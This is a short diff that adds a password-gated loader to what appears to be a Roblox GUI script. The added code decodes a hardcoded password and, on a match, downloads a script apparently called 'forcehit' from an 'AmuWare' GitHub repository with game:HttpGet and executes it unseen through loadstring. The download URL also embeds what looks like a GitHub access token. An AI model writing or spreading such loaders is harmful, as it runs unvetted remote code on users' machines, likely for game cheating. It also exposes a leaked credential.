@@ -1,3 +1,24 @@
+local a = {70,101,97,82,117,110,115,89,111,117} -- "FeaRunsYou"
+local function decode(t)
+    local s = ""
+    for i = 1, #t do
+        s = s .. string.char(t[i])
+    end
+    return s
+end
+
+print("Enter password to load script:")
+local input = io.read()
+
+if input == decode(a) then
+    local u = "https://raw.githubusercontent.com/featizm/AmuWare/refs/heads/main/forcehit?token=GHSAT0AAAAAADEFAJFFUEKQKPZWIIBWZSSC2BLMDQQ"
+    local r = game:HttpGet(u)
+    local f = loadstring(r)
+    f()
+else
+    print("Incorrect password. Access denied.")
+end
+
 local TweenService = game:GetService("TweenService")
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
